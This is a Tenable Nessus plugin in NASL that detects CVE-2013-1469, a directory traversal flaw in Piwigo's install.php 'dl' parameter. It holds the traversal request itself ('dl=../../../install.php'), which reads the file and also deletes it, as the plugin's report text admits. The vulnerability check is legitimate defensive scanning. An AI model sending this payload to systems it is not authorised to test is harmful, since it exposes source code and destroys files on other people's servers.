#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(65769);
  script_version("1.10");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2013-1469");
  script_bugtraq_id(58016);
  script_xref(name:"EDB-ID", value:"24520");

  script_name(english:"Piwigo install.php dl Parameter Traversal Arbitrary File Access");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Piwigo hosted on the remote web server is affected by a
directory traversal vulnerability because it fails to properly sanitize
user-supplied input to the 'dl' parameter of the 'install.php' script. 
This vulnerability could allow an unauthenticated, remote attacker to
read and delete arbitrary files by forming a request containing
directory traversal sequences. 

Note that the application is reportedly also affected by a cross-site
request forgery vulnerability, although Nessus has not tested this.");
  script_set_attribute(attribute:"see_also", value:"https://www.htbridge.com/advisory/HTB23144");
  script_set_attribute(attribute:"see_also", value:"https://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5127.php");
  script_set_attribute(attribute:"see_also", value:"http://piwigo.org/release-2.4.7");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.4.7 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2013-1469");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/02/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/02/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/04/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:piwigo:piwigo");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("piwigo_detect.nasl");
  script_require_keys("www/PHP", "www/piwigo");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname      : "piwigo",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(port:port, qs:dir);

url = "/install.php?dl=../../../install.php";

res = http_send_recv3(
  method       : "GET",
  item         : dir + url,
  port         : port,
  exit_on_fail : TRUE
);

if (
  "<?php" >< res[2] &&
  "if (isset($_POST['install']))" >< res[2]
)
{
  # Grab vulnerable code section for report
  out = strstr(res[2], "if (!empty($_GET['dl'])");
  # Truncate to 15 lines
  count = 0;
  foreach line (split(out))
  {
    output += line;
    count ++;
    if (count >= 15) break;
  }

  if (report_verbosity > 0)
  {
    snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\nNessus was able to verify the issue exists using the following request :' +
      '\n' +
      '\n' + install_url + url +
      '\n' +
      '\nNote that the file "install.php" has been deleted by the request above.' +   '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following truncated output :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(output) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:data_protection::sanitize_user_paths(report_text:report));
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Piwigo", install_url);
